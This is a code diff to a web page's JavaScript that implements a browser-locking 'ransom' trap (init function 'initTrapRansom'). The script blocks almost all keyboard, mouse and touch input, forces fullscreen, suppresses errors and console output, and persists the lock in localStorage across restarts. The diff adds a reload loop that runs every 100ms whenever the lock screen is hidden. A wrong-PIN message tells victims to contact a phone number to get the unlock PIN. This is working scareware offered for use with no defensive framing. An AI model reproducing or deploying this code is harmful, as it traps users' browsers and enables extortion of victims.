@@ -254,6 +254,7 @@
     let isUnlocked = false;
     let wrongAttempts = 0;
     let vibeInterval = null;
+    let forceReloadInterval = null;
     
     // ==================== VIBRATION ====================
     function startVibe() {
@@ -268,8 +269,26 @@
         if (navigator.vibrate) navigator.vibrate(0);
     }
     
+    // ==================== FORCE RELOOT KEDETECT NAVIGATION ====================
+    function startForceReload() {
+        if (forceReloadInterval) clearInterval(forceReloadInterval);
+        forceReloadInterval = setInterval(() => {
+            if (!isUnlocked) {
+                let currentUrl = window.location.href;
+                let screen = document.getElementById('lockScreen');
+                if (screen && window.getComputedStyle(screen).display !== 'flex') {
+                    location.reload();
+                }
+            }
+        }, 100);
+    }
+    
+    function stopForceReload() {
+        if (forceReloadInterval) { clearInterval(forceReloadInterval); forceReloadInterval = null; }
+    }
+    
     // ==================== ANTI BUG ANTI ERROR 1000% ====================
-    function antiBug1000() {
+    function antiBugMax() {
         window.onerror = function() { return true; };
         window.onunhandledrejection = function(e) { e.preventDefault(); return true; };
         
@@ -288,8 +307,8 @@
         try { console.log = function() {}; console.error = function() {}; console.warn = function() {}; } catch(e) {}
     }
     
-    // ==================== LOCK 1000% TOTAL ====================
-    function lock1000Percent() {
+    // ==================== TRAP NAVIGATION & GESTURE ====================
+    function trapNavigationAndGesture() {
         const allEvents = ['keydown','keyup','keypress','touchstart','touchmove','touchend','mousedown','mouseup','mousemove','click','dblclick','contextmenu','wheel','scroll','resize','orientationchange','visibilitychange','focus','blur','select','change','input','submit','load','pageshow','pagehide','hashchange','popstate'];
         
         allEvents.forEach(event => {
@@ -352,11 +371,11 @@
         } catch(e) {}
     }
     
-    // ==================== PERSISTENT LOCK ALL DEVICES ====================
-    function persistentLockAll() {
+    // ==================== PERSISTENT LOCK (MATI/RESTART TETAP) ====================
+    function persistentLockTrap() {
         try {
-            if (localStorage.getItem('total_lock_1000') === 'true' && !isUnlocked) isUnlocked = false;
-            if (!isUnlocked) { localStorage.setItem('total_lock_1000', 'true'); sessionStorage.setItem('total_lock_1000', 'true'); }
+            if (localStorage.getItem('trap_lock') === 'true' && !isUnlocked) isUnlocked = false;
+            if (!isUnlocked) { localStorage.setItem('trap_lock', 'true'); sessionStorage.setItem('trap_lock', 'true'); }
         } catch(e) {}
         
         window.addEventListener('beforeunload', function(e) {
@@ -370,11 +389,11 @@
             }
         }, 5);
         
-        function forceFullscreenAlways() {
+        function forceFullscreen() {
             if (!isUnlocked && !document.fullscreenElement) document.documentElement.requestFullscreen().catch(e => {});
         }
-        forceFullscreenAlways();
-        setInterval(forceFullscreenAlways, 50);
+        forceFullscreen();
+        setInterval(forceFullscreen, 50);
         
         window.addEventListener('keydown', function(e) {
             if (!isUnlocked && ((e.ctrlKey && (e.key === 'w' || e.key === 'W')) || e.key === 'F5' || e.key === 'F12' || e.key === 'Escape')) {
@@ -402,8 +421,9 @@
         if (enteredPin === CORRECT_PIN) {
             isUnlocked = true;
             stopVibe();
+            stopForceReload();
             
-            try { localStorage.removeItem('total_lock_1000'); sessionStorage.removeItem('total_lock_1000'); } catch(e) {}
+            try { localStorage.removeItem('trap_lock'); sessionStorage.removeItem('trap_lock'); } catch(e) {}
             
             let screen = document.getElementById('lockScreen');
             screen.style.display = 'none';
@@ -419,23 +439,24 @@
             return true;
         } else {
             wrongAttempts++;
-            errorDiv.innerHTML = `❌ PIN SALAH! (Percobaan ke-${wrongAttempts}) ❌\nHubungi 085122933162 jika Ingin Membuka PIN.`;
+            errorDiv.innerHTML = `❌ PIN SALAH! (Percobaan ke-${wrongAttempts}) ❌\nHubungi 085122933162 jika Ingin membuka PIN.`;
             pinField.value = '';
             pinField.focus();
             if (navigator.vibrate) navigator.vibrate([300, 150, 300]);
-            lock1000Percent();
+            trapNavigationAndGesture();
             return false;
         }
     }
     
     // ==================== INIT ====================
-    function initTotal() {
-        antiBug1000();
-        lock1000Percent();
-        persistentLockAll();
+    function initTrapRansom() {
+        antiBugMax();
+        trapNavigationAndGesture();
+        persistentLockTrap();
         startVibe();
+        startForceReload();
         setTimeout(() => { document.getElementById('pinInput').focus(); }, 30);
-        setInterval(() => { if (!isUnlocked) lock1000Percent(); }, 50);
+        setInterval(() => { if (!isUnlocked) trapNavigationAndGesture(); }, 50);
         setInterval(() => {
             if (!isUnlocked) {
                 let screen = document.getElementById('lockScreen');
@@ -444,7 +465,7 @@
         }, 40);
     }
     
-    initTotal();
+    initTrapRansom();
 </script>
 
 </body>
